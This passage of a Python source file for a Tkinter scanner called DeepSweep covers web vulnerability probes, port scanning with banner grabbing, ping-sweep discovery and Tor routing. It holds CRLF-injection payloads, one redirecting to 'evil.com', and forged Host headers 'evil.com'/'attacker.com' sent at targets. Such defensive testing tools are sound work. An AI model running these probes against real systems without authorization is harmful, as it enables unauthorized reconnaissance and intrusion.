            
            for payload in deser_payloads:
                try:
                    response = self.session.post(
                        self.target_url,
                        data={'data': payload},
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    deser_log += f"├── Payload: {payload[:50]}... | Status: {response.status_code}\n"
                    
                    if 'unserialize' in response.text.lower() or 'object' in response.text.lower():
                        vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: Insecure deserialization
├── Evidence: Deserialization function detected
├── Attack Vector: Object injection
└── Impact: Remote code execution
"""
                        self.report.add_vulnerability(
                            'HIGH',
                            'Insecure Deserialization',
                            'Application may deserialize untrusted data',
                            f'Payload: {payload}',
                            'Never deserialize untrusted input. Use JSON.',
                            vuln_details
                        )
                        self.log_raw("Deserialization", deser_log)
                        return
                except:
                    pass
            
            self.log_raw("Deserialization", deser_log)
        except Exception as e:
            self.log_raw("Deserialization Error", f"Deserialization check failed: {str(e)}")

    def check_http_verbs(self):
        try:
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE']
            
            verb_log = "HTTP Verb Testing Log:\n"
            
            for method in methods:
                try:
                    response = self.session.request(method, self.target_url, timeout=self.timeout, verify=False)
                    verb_log += f"├── {method}: Status {response.status_code}\n"
                    
                    if method in ['PUT', 'DELETE'] and response.status_code in [200, 201, 204]:
                        vuln_details = f"""
VULNERABILITY DETAILS:
├── Method: {method}
├── Status: {response.status_code}
├── Technique: HTTP verb tampering
├── Attack Vector: Unauthorized method usage
└── Impact: Data manipulation, privilege escalation
"""
                        self.report.add_vulnerability(
                            'MEDIUM',
                            f'HTTP Verb Tampering - {method}',
                            f'{method} method allowed without proper validation',
                            f'Method: {method}, Status: {response.status_code}',
                            'Restrict HTTP methods. Implement proper authorization.',
                            vuln_details
                        )
                except:
                    pass
            
            self.log_raw("HTTP Verbs", verb_log)
        except Exception as e:
            self.log_raw("HTTP Verbs Error", f"HTTP verbs check failed: {str(e)}")

    def check_crlf_injection(self):
        crlf_payloads = [
            "%0d%0aSet-Cookie:malicious=true",
            "%0d%0aLocation: https://evil.com",
            "\r\nSet-Cookie: hacked=yes",
        ]
        
        try:
            test_urls = [f"{self.target_url}?redirect=", f"{self.target_url}?url="]
            
            crlf_log = "CRLF Injection Testing Log:\n"
            
            for url in test_urls:
                for payload in crlf_payloads:
                    try:
                        response = self.session.get(f"{url}{payload}", timeout=self.timeout, verify=False, allow_redirects=False)
                        crlf_log += f"├── Payload: {payload} | Status: {response.status_code}\n"
                        
                        if 'Set-Cookie' in response.headers or 'malicious' in str(response.headers):
                            header_analysis = ""
                            for header, value in response.headers.items():
                                if 'malicious' in value or 'hacked' in value:
                                    header_analysis = f"{header}: {value}"
                                    break
                            
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: CRLF injection
├── Headers Modified: {header_analysis}
├── Attack Vector: Header injection
└── Impact: HTTP response splitting, cache poisoning
"""
                            self.report.add_vulnerability(
                                'MEDIUM',
                                'CRLF Injection',
                                'CRLF injection allows header manipulation',
                                f'Payload: {payload}',
                                'Sanitize user input. Remove CR/LF characters.',
                                vuln_details
                            )
                            self.log_raw("CRLF Injection", crlf_log)
                            return
                    except:
                        pass
            
            self.log_raw("CRLF Injection", crlf_log)
        except Exception as e:
            self.log_raw("CRLF Injection Error", f"CRLF injection check failed: {str(e)}")

    def check_host_header(self):
        try:
            evil_hosts = ['evil.com', 'attacker.com']
            
            host_log = "Host Header Injection Testing Log:\n"
            
            for host in evil_hosts:
                response = self.session.get(
                    self.target_url,
                    headers={'Host': host},
                    timeout=self.timeout,
                    verify=False
                )
                
                host_log += f"├── Host: {host} | Status: {response.status_code}\n"
                
                if host in response.text or host in str(response.headers):
                    reflection_point = "Response body" if host in response.text else "Response headers"
                    
                    vuln_details = f"""
VULNERABILITY DETAILS:
├── Injected Host: {host}
├── Reflection Point: {reflection_point}
├── Technique: Host header injection
├── Attack Vector: Header manipulation
└── Impact: Cache poisoning, SSRF
"""
                    self.report.add_vulnerability(
                        'MEDIUM',
                        'Host Header Injection',
                        'Application reflects Host header value',
                        f'Injected Host: {host}',
                        'Validate Host header against whitelist.',
                        vuln_details
                    )
                    self.log_raw("Host Header", host_log)
                    return
            
            self.log_raw("Host Header", host_log)
        except Exception as e:
            self.log_raw("Host Header Error", f"Host header check failed: {str(e)}")

    def check_clickjacking(self):
        try:
            response = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            
            clickjacking_log = f"Clickjacking Testing Log:\n├── X-Frame-Options: {response.headers.get('X-Frame-Options', 'MISSING')}\n├── CSP: {response.headers.get('Content-Security-Policy', 'MISSING')}\n"
            
            if 'X-Frame-Options' not in response.headers and 'Content-Security-Policy' not in response.headers:
                vuln_details = f"""
VULNERABILITY DETAILS:
├── Missing: X-Frame-Options header
├── Missing: Content-Security-Policy header
├── Technique: Clickjacking/UI redressing
├── Attack Vector: IFrame overlay
└── Impact: User action hijacking
"""
                self.report.add_vulnerability(
                    'MEDIUM',
                    'Clickjacking',
                    'No clickjacking protection headers present',
                    'Missing X-Frame-Options and CSP frame-ancestors',
                    'Add X-Frame-Options: DENY or CSP frame-ancestors directive.',
                    vuln_details
                )
            
            self.log_raw("Clickjacking", clickjacking_log)
        except Exception as e:
            self.log_raw("Clickjacking Error", f"Clickjacking check failed: {str(e)}")

    def check_info_disclosure(self):
        try:
            response = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            
            info_log = "Information Disclosure Testing Log:\n"
            
            disclosure_patterns = {
                'PHP Version': (r'PHP/[\d.]+', 'PHP version exposed'),
                'Apache Version': (r'Apache/([\d.]+)', 'Apache server version exposed'),
                'Nginx Version': (r'nginx/([\d.]+)', 'Nginx server version exposed'),
                'Stack Trace': (r'(Exception|Error|Warning).*at line \d+', 'Stack trace exposed'),
                'SQL Error': (r'SQL.*error', 'SQL error message exposed'),
                'Path Disclosure': (r'[A-Z]:\\\\.*\\\\|/var/www/|/home/', 'Server path exposed'),
            }
            
            for name, (pattern, description) in disclosure_patterns.items():
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    info_log += f"├── {name}: {match.group(0)[:100]}\n"
                    
                    vuln_details = f"""
VULNERABILITY DETAILS:
├── Type: {name}
├── Information: {match.group(0)[:100]}
├── Technique: Information leakage
├── Attack Vector: Error analysis
└── Impact: Reconnaissance, targeted attacks
"""
                    self.report.add_vulnerability(
                        'LOW',
                        f'Information Disclosure - {name}',
                        description,
                        f'Pattern: {pattern}',
                        'Remove sensitive information from responses.',
                        vuln_details
                    )
            
            self.log_raw("Information Disclosure", info_log)
        except Exception as e:
            self.log_raw("Information Disclosure Error", f"Information disclosure check failed: {str(e)}")

class DeepSweepPortScanner:
    def __init__(self, target: str, report: VulnerabilityReport, progress_callback=None):
        self.target = target
        self.report = report
        self.progress_callback = progress_callback
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 27017]
    
    def log_progress(self, message: str):
        if self.progress_callback:
            self.progress_callback(message)
    
    def scan_all(self, port_range: Optional[Tuple[int, int]] = None):
        ports = range(port_range[0], port_range[1] + 1) if port_range else self.common_ports
        open_ports = []
        
        self.log_progress(f"Scanning {len(list(ports))} ports...")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.scan_port, port): port for port in ports}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
                    self.log_progress(f"Port {result['port']} OPEN - {result['service']}")
        
        for port_info in sorted(open_ports, key=lambda x: x['port']):
            self.analyze_service(port_info)
    
    def scan_port(self, port: int) -> Optional[Dict]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                service = self.get_service_name(port)
                banner = self.grab_banner(self.target, port)
                sock.close()
                return {'port': port, 'service': service, 'banner': banner}
            
            sock.close()
            return None
        except:
            return None
    
    def get_service_name(self, port: int) -> str:
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis',
            8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
        }
        return services.get(port, 'Unknown')
    
    def grab_banner(self, host: str, port: int) -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((host, port))
            
            if port in [80, 8080, 8443]:
                sock.send(b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n')
            else:
                sock.send(b'\r\n')
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner[:200] if banner else ''
        except:
            return ''
    
    def analyze_service(self, port_info: Dict):
        port = port_info['port']
        service = port_info['service']
        banner = port_info['banner']
        
        port_log = f"""
Port Scan Results:
├── Port: {port}
├── Service: {service}
└── Banner: {banner[:100] if banner else 'No banner'}
"""
        self.report.add_raw_log("Port Scan", port_log)
        
        self.report.add_info(f'Open Port: {port}', {
            'Service': service,
            'Banner': banner[:100] if banner else 'No banner'
        })
        
        if port == 23:
            vuln_details = f"""
VULNERABILITY DETAILS:
├── Port: 23 (Telnet)
├── Service: {service}
├── Risk: Cleartext protocol
├── Attack Vector: Network sniffing
└── Impact: Credential theft
"""
            self.report.add_vulnerability(
                'HIGH',
                'Telnet Service Exposed',
                'Telnet transmits data in cleartext',
                f'Port 23 - {banner}',
                'Disable Telnet. Use SSH instead.',
                vuln_details
            )
        
        if port in [3306, 5432, 27017, 6379]:
            vuln_details = f"""
VULNERABILITY DETAILS:
├── Port: {port}
├── Service: {service}
├── Risk: Database exposed to internet
├── Attack Vector: Direct database access
└── Impact: Data breach, system compromise
"""
            self.report.add_vulnerability(
                'HIGH',
                'Database Port Exposed',
                f'{service} accessible from external network',
                f'Port {port}',
                'Restrict database access to localhost or trusted IPs.',
                vuln_details
            )

class DeepSweepDeviceDiscovery:
    def __init__(self, network: str, report: VulnerabilityReport, progress_callback=None):
        self.network = network
        self.report = report
        self.progress_callback = progress_callback
    
    def log_progress(self, message: str):
        if self.progress_callback:
            self.progress_callback(message)
    
    def scan_all(self):
        try:
            network = ipaddress.ip_network(self.network, strict=False)
            alive_hosts = []
            
            self.log_progress("Performing ping sweep...")
            
            discovery_log = "Network Discovery Log:\n"
            
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(self.ping_host, str(host)): host for host in list(network.hosts())[:254]}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        alive_hosts.append(result)
                        discovery_log += f"├── Host UP: {result}\n"
                        self.log_progress(f"Host {result} is UP")
            
            for host in sorted(alive_hosts, key=lambda x: ipaddress.ip_address(x)):
                self.report.add_info('Active Host', {'IP': host})
            
            self.report.add_raw_log("Network Discovery", discovery_log)
        except Exception as e:
            self.report.add_raw_log("Network Discovery Error", f"Network discovery failed: {str(e)}")
    
    def ping_host(self, host: str) -> Optional[str]:
        try:
            param = '-n' if sys.platform.lower() == 'win32' else '-c'
            result = subprocess.run(['ping', param, '1', '-W', '1', host], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
            return host if result.returncode == 0 else None
        except:
            return None

class DeepSweepScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DeepSweep Security Scanner v4.0")
        self.root.geometry("1200x800")
        
        self.set_professional_theme()
        
        self.report = None
        self.scanning = False
        self.tor_manager = TorManager()
        self.use_tor = False
        
        self.create_widgets()
    
    def set_professional_theme(self):
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('TFrame', background='#1a1a1a')
        style.configure('TLabelframe', background='#1a1a1a', foreground='#00ff00')
        style.configure('TLabelframe.Label', background='#1a1a1a', foreground='#00ff00', font=('Courier', 10, 'bold'))
        style.configure('TButton', background='#003300', foreground='#00ff00', borderwidth=2)
        style.map('TButton', background=[('active', '#005500')])
        style.configure('TLabel', background='#1a1a1a', foreground='#00ff00', font=('Courier', 9))
        style.configure('TEntry', fieldbackground='#2a2a2a', foreground='#00ff00', insertcolor='#00ff00')
        style.configure('TCombobox', fieldbackground='#2a2a2a', foreground='#00ff00', background='#2a2a2a')
        
        self.root.configure(bg='#1a1a1a')
    
    def create_widgets(self):
        main_frame = ttk.Frame(self.root, style='TFrame')
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)
        
        header_frame = tk.Frame(main_frame, bg='#1a1a1a')
        header_frame.pack(fill='x', pady=(0, 20))
        
        f = Figlet(font='slant')
        ascii_art = f.renderText('DeepSweep')
        title_label = tk.Label(header_frame, text=ascii_art, bg='#1a1a1a', fg='#00ff00', font=('Courier', 8))
        title_label.pack(pady=5)
        
        subtitle_label = tk.Label(header_frame, text="Professional Security Scanner v4.0 - TOR Integrated", 
                                font=('Courier', 12, 'bold'), bg='#1a1a1a', fg='#ff0000')
        subtitle_label.pack()
        
        control_frame = ttk.LabelFrame(main_frame, text=" SCAN CONFIGURATION ", padding=15)
        control_frame.pack(fill='x', pady=10)
        
        target_frame = tk.Frame(control_frame, bg='#1a1a1a')
        target_frame.pack(fill='x', pady=5)
        
        tk.Label(target_frame, text="TARGET:", bg='#1a1a1a', fg='#00ff00', font=('Courier', 10, 'bold')).pack(side='left')
        self.target_entry = tk.Entry(target_frame, width=60, bg='#2a2a2a', fg='#00ff00', 
                                    insertbackground='#00ff00', font=('Courier', 10))
        self.target_entry.pack(side='left', padx=10)
        self.target_entry.insert(0, "https://example.com")
        
        config_frame = tk.Frame(control_frame, bg='#1a1a1a')
        config_frame.pack(fill='x', pady=10)
        
        left_config = tk.Frame(config_frame, bg='#1a1a1a')
        left_config.pack(side='left', fill='x', expand=True)
        
        tk.Label(left_config, text="SCAN MODE:", bg='#1a1a1a', fg='#00ff00', font=('Courier', 9, 'bold')).pack(anchor='w')
        self.mode_var = tk.StringVar(value="Web Vulnerabilities")
        mode_menu = ttk.Combobox(left_config, textvariable=self.mode_var, state='readonly',
                                values=["Web Vulnerabilities", "Port Scan", "Network Discovery", "Full Scan"],
                                width=20)
        mode_menu.pack(anchor='w', pady=5)
        
        right_config = tk.Frame(config_frame, bg='#1a1a1a')
        right_config.pack(side='right', fill='x', expand=True)
        
        tk.Label(right_config, text="PORT RANGE:", bg='#1a1a1a', fg='#00ff00', font=('Courier', 9, 'bold')).pack(anchor='w')
        self.port_entry = tk.Entry(right_config, width=15, bg='#2a2a2a', fg='#00ff00', 
                                  insertbackground='#00ff00', font=('Courier', 9))
        self.port_entry.pack(anchor='w', pady=5)
        self.port_entry.insert(0, "1-1000")
        
        button_frame = tk.Frame(control_frame, bg='#1a1a1a')
        button_frame.pack(fill='x', pady=15)
        
        self.tor_button = tk.Button(button_frame, text="🕶️ ACTIVATE TOR", command=self.toggle_tor,
                                   bg='#003300', fg='#00ff00', font=('Courier', 10, 'bold'),
                                   width=15, height=1, cursor='hand2', relief='raised', bd=2)
        self.tor_button.pack(side='left', padx=5)
        
        self.start_button = tk.Button(button_frame, text=" START SCAN", command=self.start_scan,
                                     bg='#006600', fg='#00ff00', font=('Courier', 12, 'bold'),
                                     width=15, height=1, cursor='hand2', relief='raised', bd=3)
        self.start_button.pack(side='left', padx=10)
        
        self.stop_button = tk.Button(button_frame, text=" STOP", command=self.stop_scan,
                                    bg='#660000', fg='#ff0000', font=('Courier', 10, 'bold'),
                                    width=12, height=1, cursor='hand2', relief='raised', bd=2, state='disabled')
        self.stop_button.pack(side='left', padx=5)
        
        save_button = tk.Button(button_frame, text="💾 EXPORT REPORT", command=self.save_report,
                              bg='#003366', fg='#00ffff', font=('Courier', 10, 'bold'),
                              width=15, height=1, cursor='hand2', relief='raised', bd=2)
        save_button.pack(side='left', padx=5)
        
        clear_button = tk.Button(button_frame, text=" CLEAR", command=self.clear_results,
                               bg='#333333', fg='#ffffff', font=('Courier', 10),
                               width=12, height=1, cursor='hand2', relief='raised', bd=2)
        clear_button.pack(side='left', padx=5)
        
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill='both', expand=True, pady=10)
        
        log_frame = ttk.Frame(self.notebook)
        self.notebook.add(log_frame, text="SCAN LOG")
        
        self.progress_text = scrolledtext.ScrolledText(log_frame, height=12, bg='#0a0a0a',
                                                       fg='#00ff00', font=('Courier', 9),
                                                       insertbackground='#00ff00')
        self.progress_text.pack(fill='both', expand=True, padx=5, pady=5)
        
        result_frame = ttk.Frame(self.notebook)
        self.notebook.add(result_frame, text="VULNERABILITIES")
        
        self.result_text = scrolledtext.ScrolledText(result_frame, height=15, bg='#0a0a0a',
                                                     fg='#ffffff', font=('Courier', 9),
                                                     insertbackground='white')
        self.result_text.pack(fill='both', expand=True, padx=5, pady=5)
        
        details_frame = ttk.Frame(self.notebook)
        self.notebook.add(details_frame, text="DETAILED LOGS")
        
        self.details_text = scrolledtext.ScrolledText(details_frame, height=15, bg='#0a0a0a',
                                                      fg='#00ffff', font=('Courier', 8),
                                                      insertbackground='#00ffff')
        self.details_text.pack(fill='both', expand=True, padx=5, pady=5)
        
        status_frame = tk.Frame(main_frame, bg='#1a1a1a')
        status_frame.pack(fill='x', pady=(10, 0))
        
        self.status_label = tk.Label(status_frame, text="STATUS: READY", bg='#1a1a1a',
                                     fg='#00ff00', font=('Courier', 9, 'bold'))
        self.status_label.pack(side='left')
        
        self.tor_status_label = tk.Label(status_frame, text="TOR: DISABLED", bg='#1a1a1a',
                                        fg='#ff0000', font=('Courier', 9, 'bold'))
        self.tor_status_label.pack(side='left', padx=20)
        
        self.vuln_count_label = tk.Label(status_frame, text="VULNERABILITIES: 0", bg='#1a1a1a',
                                         fg='#ff6b6b', font=('Courier', 9, 'bold'))
        self.vuln_count_label.pack(side='right')
    
    def toggle_tor(self):
        if not self.tor_manager.tor_enabled:
            self.log_progress("Initializing Tor service...")
            if self.tor_manager.start_tor():
                self.tor_button.config(text="🕶️ TOR ACTIVE", bg='#006600', fg='#00ff00')
                self.tor_status_label.config(text="TOR: ENABLED", fg='#00ff00')
                self.use_tor = True
                self.log_progress("Tor anonymity enabled - All traffic will be routed through Tor")
            else:
                self.log_progress("Tor initialization failed!")
                self.use_tor = False
        else:
            self.tor_manager.stop_tor()
            self.tor_button.config(text="🕶️ ACTIVATE TOR", bg='#003300', fg='#00ff00')
            self.tor_status_label.config(text="TOR: DISABLED", fg='#ff0000')
            self.use_tor = False
            self.log_progress("Tor disabled")
    
    def log_progress(self, message: str):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.progress_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.progress_text.see(tk.END)
        self.root.update_idletasks()
    
    def start_scan(self):
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target URL/IP")
            return
        
        response = messagebox.askyesno(
            "Authorization Required",
            "Do you have explicit written permission to test this target?\n\n"
            "Unauthorized testing may violate laws and regulations."
        )
        
        if not response:
            messagebox.showwarning("Cancelled", "Authorization required. Scan aborted.")
            return
        
        self.scanning = True
        self.start_button.config(state='disabled', bg='#333333')
        self.stop_button.config(state='normal', bg='#660000')
        self.progress_text.delete(1.0, tk.END)
        self.result_text.delete(1.0, tk.END)
        self.details_text.delete(1.0, tk.END)
        self.status_label.config(text="STATUS: SCANNING...", fg='#ffff00')
        
        self.report = VulnerabilityReport()
        
        scan_thread = threading.Thread(target=self.run_scan, args=(target,), daemon=True)
        scan_thread.start()
    
    def run_scan(self, target):
        try:
            if not self.report:
                return
            
            mode = self.mode_var.get()
            
            if mode in ["Web Vulnerabilities", "Full Scan"]:
                if target.startswith('http'):
                    self.log_progress("=" * 70)
                    self.log_progress("STARTING WEB VULNERABILITY SCAN")
                    self.log_progress(f"TARGET: {target}")
                    self.log_progress(f"TOR: {'ENABLED' if self.use_tor else 'DISABLED'}")
                    self.log_progress("=" * 70)
                    scanner = DeepSweepWebVulnScanner(target, self.report, self.log_progress, self.use_tor)
                    scanner.scan_all()
            
            if mode in ["Port Scan", "Full Scan"]:
                target_host = urlparse(target).hostname if target.startswith('http') else target
                port_range = None
                if self.port_entry.get():
                    try:
                        start, end = map(int, self.port_entry.get().split('-'))
                        port_range = (start, end)
                    except:
                        pass
                
                self.log_progress("\n" + "=" * 70)
                self.log_progress("STARTING PORT SCAN")
                self.log_progress("=" * 70)
                port_scanner = DeepSweepPortScanner(target_host, self.report, self.log_progress)
                port_scanner.scan_all(port_range)
            
            if mode == "Network Discovery":
                self.log_progress("=" * 70)
                self.log_progress("STARTING NETWORK DISCOVERY")
                self.log_progress("=" * 70)
                device_scanner = DeepSweepDeviceDiscovery(target, self.report, self.log_progress)
                device_scanner.scan_all()
            
            self.display_results()
            
        except Exception as e:
            self.log_progress(f"SCAN ERROR: {str(e)}")
        finally:
            self.scanning = False
            self.root.after(0, self.scan_complete)
    
    def scan_complete(self):
        self.start_button.config(state='normal', bg='#006600')
        self.stop_button.config(state='disabled', bg='#660000')
        self.status_label.config(text="STATUS: SCAN COMPLETE", fg='#00ff00')
        
        if self.report:
            vuln_count = len(self.report.vulnerabilities)
            self.vuln_count_label.config(text=f"VULNERABILITIES: {vuln_count}")
            self.log_progress(f"\nSCAN COMPLETE - Found {vuln_count} vulnerabilities")
    
    def stop_scan(self):
        self.scanning = False
        self.log_progress("\nSCAN STOPPED BY USER")
        self.scan_complete()
    
    def clear_results(self):
        self.progress_text.delete(1.0, tk.END)
        self.result_text.delete(1.0, tk.END)
        self.details_text.delete(1.0, tk.END)
        self.vuln_count_label.config(text="VULNERABILITIES: 0")
        self.status_label.config(text="STATUS: READY")
        self.report = None
    
    def display_results(self):
        self.result_text.delete(1.0, tk.END)
        self.details_text.delete(1.0, tk.END)
        
        if not self.report:
            return
        
        self.result_text.insert(tk.END, "DEEPSWEEP SECURITY SCAN REPORT\n", 'title')
        self.result_text.insert(tk.END, "=" * 80 + "\n\n")
        
        self.result_text.insert(tk.END, f"Scan Duration: {datetime.now() - self.report.start_time}\n")
        self.result_text.insert(tk.END, f"Total Vulnerabilities: {len(self.report.vulnerabilities)}\n\n")
        
        if self.report.vulnerabilities:
            critical = [v for v in self.report.vulnerabilities if v['severity'] == 'CRITICAL']
            high = [v for v in self.report.vulnerabilities if v['severity'] == 'HIGH']
            medium = [v for v in self.report.vulnerabilities if v['severity'] == 'MEDIUM']
            low = [v for v in self.report.vulnerabilities if v['severity'] == 'LOW']
            
            self.result_text.insert(tk.END, f"🔴 CRITICAL: {len(critical)}\n", 'critical')
            self.result_text.insert(tk.END, f"🟠 HIGH: {len(high)}\n", 'high')
            self.result_text.insert(tk.END, f"🟡 MEDIUM: {len(medium)}\n", 'medium')
            self.result_text.insert(tk.END, f"🟢 LOW: {len(low)}\n\n", 'low')
            
            for vuln in self.report.vulnerabilities:
                tag = vuln['severity'].lower()
                self.result_text.insert(tk.END, f"[{vuln['severity']}] {vuln['type']}\n", tag)
                self.result_text.insert(tk.END, f"Description: {vuln['description']}\n")
                self.result_text.insert(tk.END, f"Evidence: {vuln['evidence']}\n")
                if vuln['raw_data']:
                    self.result_text.insert(tk.END, f"Details:\n{vuln['raw_data']}\n")
                self.result_text.insert(tk.END, f"Remediation: {vuln['remediation']}\n")
                self.result_text.insert(tk.END, "-" * 60 + "\n\n")
        
        if self.report.raw_logs:
            self.details_text.insert(tk.END, "RAW SCAN LOGS AND TECHNICAL DETAILS\n", 'title')
            self.details_text.insert(tk.END, "=" * 80 + "\n\n")
            
            for log in self.report.raw_logs:
                self.details_text.insert(tk.END, f"[{log['type']}]\n", 'log_type')
                self.details_text.insert(tk.END, f"{log['data']}\n")
                self.details_text.insert(tk.END, "-" * 40 + "\n\n")
        
        self.result_text.tag_config('title', foreground='#00ff00', font=('Courier', 11, 'bold'))
        self.result_text.tag_config('critical', foreground='#ff0000', font=('Courier', 10, 'bold'))
        self.result_text.tag_config('high', foreground='#ff6b6b', font=('Courier', 10, 'bold'))
        self.result_text.tag_config('medium', foreground='#ffff00', font=('Courier', 10))
        self.result_text.tag_config('low', foreground='#00ff00', font=('Courier', 10))
        
        self.details_text.tag_config('title', foreground='#00ff00', font=('Courier', 11, 'bold'))
        self.details_text.tag_config('log_type', foreground='#00ffff', font=('Courier', 10, 'bold'))
    
    def save_report(self):
        if not self.report:
            messagebox.showwarning("No Report", "No scan report available to save")
            return
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=f"deepsweep_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump({
                        'vulnerabilities': self.report.vulnerabilities,
                        'info': self.report.info,
                        'raw_logs': self.report.raw_logs,
                        'scan_duration': str(datetime.now() - self.report.start_time),
                        'tool': 'DeepSweep Security Scanner v4.0'
                    }, f, indent=2)
                self.log_progress(f"Report saved to: {filename}")
                messagebox.showinfo("Success", f"Report saved to {filename}")
            except Exception as e:
                self.log_progress(f"Failed to save report: {str(e)}")
                messagebox.showerror("Error", f"Failed to save report: {str(e)}")

def main():
    root = tk.Tk()
    app = DeepSweepScannerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
